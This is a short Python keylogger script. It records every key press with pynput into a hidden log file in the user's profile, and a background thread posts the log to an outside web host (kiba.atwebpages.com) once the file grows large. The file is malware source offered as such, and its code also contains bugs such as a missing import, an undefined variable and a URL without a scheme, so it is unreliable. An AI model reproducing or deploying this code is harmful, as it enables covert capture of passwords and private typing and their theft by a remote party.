from pynput.keyboard import Listener
import os
import requests
import threading
i = 0
a = 2
#encode('utf-8')
def check_net():
    r = requests.get("www.google.com")
    return r
def exfil():
    stat = os.stat(path)
    size = stat.st_size
    if size >=100000:
        file = open(path, "r")
        data = file.read()
        par = {"data":data}
        req = requests.post("http://kiba.atwebpages.com/kiba.php", par=params)
def exfil_daemon():
    i = 1
    while i<100:
        time.sleep(600)
        r = check_net()
        if r == 200:
            exfil()
        if r == 301:
            exfil()
        if r==404:
            exfil()
user = os.getlogin()
path = "C:\\Users\\"+user+"\\.config\\logs.txt"
def write(key):
    #letter1  = "kiba"
    letter = str(key)
    letter =  " " + letter + "\n"
    #letter = letter.replace("u", "")
    fil = open(path, "a+")
    fil.write(letter)
t = threading.Thread(target=exfil_daemon)
t.daemon = True
t.start()
with Listener(on_press=write) as l:
     l.join()
